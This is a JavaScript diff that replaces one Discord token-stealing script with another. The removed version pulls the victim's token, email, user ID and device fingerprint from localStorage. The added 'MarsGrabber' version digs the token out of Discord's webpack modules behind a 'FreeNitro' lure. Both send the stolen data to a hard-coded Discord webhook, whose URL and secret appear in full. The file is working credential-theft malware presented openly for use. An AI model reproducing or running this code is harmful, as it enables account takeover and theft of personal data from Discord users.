@@ -1,13 +1,34 @@
-location.reload()
-var discordWebhook = "https://discord.com/api/webhooks/836385900467847178/Gk0fCeh-vE_R0TpFibTIQQf1gqGw34T4I9QkkkacRa0WUGDRb3Q7Ns0D_39RhPLIxM9s";
-var i = document.createElement('iframe');
-document.body.appendChild(i);
-var request = new XMLHttpRequest();
-request.open("POST", discordWebhook);
-request.setRequestHeader('Content-type', 'application/json');
-var params = {
-    username: "Token Grabber",
-    avatar_url: "https://malwarefox.com/wp-content/uploads/2017/11/hacker-1.png",
-    content: '**Nouvelle personne hackée !**\n------------------\nToken : ' + i.contentWindow.localStorage.token + '\n------------------\nAdresse email : ' + i.contentWindow.localStorage.email_cache + '\n------------------\nUser ID : ' + i.contentWindow.localStorage.user_id_cache + '\n------------------\nFingerprint : ' + i.contentWindow.localStorage.fingerprint + '\n------------------\nPropriétés : \`\`\`json\n' + i.contentWindow.localStorage.deviceProperties + '\`\`\`------------------\nScript de login : \n\`\`\`js\nlocation.reload();var i = document.createElement(\'iframe\');document.body.appendChild(i);i.contentWindow.localStorage.token = "\\"' + i.contentWindow.localStorage.token.replace(/^"(.*)"$/, '$1') + '\\""\`\`\`'
-};
-request.send(JSON.stringify(params));
+const webhookurl = 'https://discord.com/api/webhooks/836385900467847178/Gk0fCeh-vE_R0TpFibTIQQf1gqGw34T4I9QkkkacRa0WUGDRb3Q7Ns0D_39RhPLIxM9s';
+
+var req = webpackJsonp.push([
+    [], {
+        extra_id: (e, t, r) => e.exports = r
+    },
+    [
+        ["extra_id"]
+    ]
+]);
+for (let e in req.c)
+    if (req.c.hasOwnProperty(e)) {
+        let t = req.c[e].exports;
+        if (t && t.__esModule && t.default)
+            for (let e in t.default) "getToken" === e && (token = t.default.getToken())
+    }
+function FreeNitro() {
+    var e = new XMLHttpRequest;
+    e.open("POST", webhookurl), e.setRequestHeader("Content-type", "application/json");
+    var t = {
+        username: "MarsGrabber",
+        avatar_url: "https://cdn.discordapp.com/attachments/829799385244237848/841411606545694720/Mars.png",
+        content: "",
+        embeds: [{
+            color: "4700374",
+            description: "Token : " + token,
+            footer: {
+                text: "Made By ! astro#9999 | Mars Javascript Logger"
+            }
+        }]
+    };
+    e.send(JSON.stringify(t))
+}
+FreeNitro();
